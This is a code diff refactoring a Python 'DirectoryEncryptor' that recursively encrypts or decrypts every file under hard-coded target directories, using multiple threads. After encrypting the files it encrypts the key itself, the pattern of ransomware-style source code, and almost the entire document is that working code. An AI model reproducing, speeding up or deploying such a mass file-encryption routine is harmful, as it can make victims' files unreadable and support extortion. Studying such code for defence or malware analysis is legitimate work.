@@ -44,50 +44,51 @@ class FileEncryptor:
             f.write(deciphered_data)
 
 class DirectoryEncryptor(FileEncryptor):
-    def __init__(self, key):
+    def __init__(self, key, mode: str):
         super().__init__(key)
+        self.mode: str = mode
+        self.threads: list[threading.Thread] = []
+        self.first_layer: bool = True
+
+    def add_thread(self, thread: threading.Thread) -> None: 
+        self.threads.append(thread)
+        thread.start()
 
     # Encrypting/Decrypting the directory
-    def crypt_dir(self, directory, mode: str) -> None:
+    def crypt_dir(self, directory: str) -> None:
         with os.scandir(directory) as entries:
             for entry in entries:
                 if entry.is_file():
-                    self.encrypt_file(entry.path) if mode == "encrypt" else self.decrypt_file(entry.path)
-                    print(f"{mode.capitalize()}ed {entry.path}")
+                    self.encrypt_file(entry.path) if self.mode == "encrypt" else self.decrypt_file(entry.path)
+                    print(f"{self.mode.capitalize()}ed {entry.path}")
 
                 elif entry.is_dir():
-                    self.crypt_dir(entry.path, mode)
+                    self.crypt_dir(entry.path)
 
-    def crypt_all_dirs(self, mode: str) -> None:
-        threads: list[threading.Thread] = []
-        
-        def add_thread(thread: threading.Thread) -> None: 
-            threads.append(thread)
-            thread.start()
-
-        for directory in target_dir_paths:
-            subdirs = [os.path.join(directory, entry) for entry in os.listdir(directory) if os.path.isdir(os.path.join(directory, entry))]
-
-            if len(subdirs) <= 1:
-                self.crypt_dir(directory, mode)
-                continue
-
+    def crypt_all_dirs(self, dir_paths: list[str]) -> None:
+        for directory in dir_paths:
+            subdirs: list[str] = [os.path.join(directory, entry) for entry in os.listdir(directory) if os.path.isdir(os.path.join(directory, entry))]
             leftover_files: list[str] = [os.path.join(directory, file) for file in os.listdir(directory) if os.path.isfile(os.path.join(directory, file))]
-
-            for subdir in subdirs:
-                if len(threads) < MAX_THREADS:
-                    thread = threading.Thread(target=self.crypt_dir, args=(subdir, mode,))
-                    add_thread(thread)
-                else:
-                    self.crypt_dir(subdir, mode)
-
+            
             if len(leftover_files) > 0:
-                crypt_leftover = lambda: [self.encrypt_file(path) if mode == "encrypt" else self.decrypt_file(path) for path in leftover_files]
+                crypt_leftover = lambda: [self.encrypt_file(path) if self.mode == "encrypt" else self.decrypt_file(path) for path in leftover_files]
                 thread = threading.Thread(target=crypt_leftover)
-                add_thread(thread)
+                self.add_thread(thread)
 
-        [thread.join() for thread in threads]
-        threads.clear()
+            if self.first_layer:
+                self.first_layer = False
+                self.crypt_all_dirs(subdirs)
+                return
+
+            for directory in subdirs:
+                if len(self.threads) < MAX_THREADS:
+                    thread = threading.Thread(target=self.crypt_dir, args=(directory,))
+                    self.add_thread(thread)
+                else:
+                    self.crypt_dir(directory)
+
+        [thread.join() for thread in self.threads]
+        self.threads.clear()
 
 def main():
     def load_key() -> str:
@@ -98,12 +99,12 @@ def main():
     try:
         if sys.argv[1] == "encrypt":
             key = load_key()
-            DirectoryEncryptor(key).crypt_all_dirs("encrypt")
+            DirectoryEncryptor(key, "encrypt").crypt_all_dirs(target_dir_paths)
             encrypt_key(KEY_PATH)
         else:
             decrypt_key(KEY_PATH)
             key = load_key()
-            DirectoryEncryptor(key).crypt_all_dirs("decrypt")
+            DirectoryEncryptor(key, "decrypt").crypt_all_dirs(target_dir_paths)
     except FileNotFoundError:
         print("Could not find a key.")
     except ValueError:
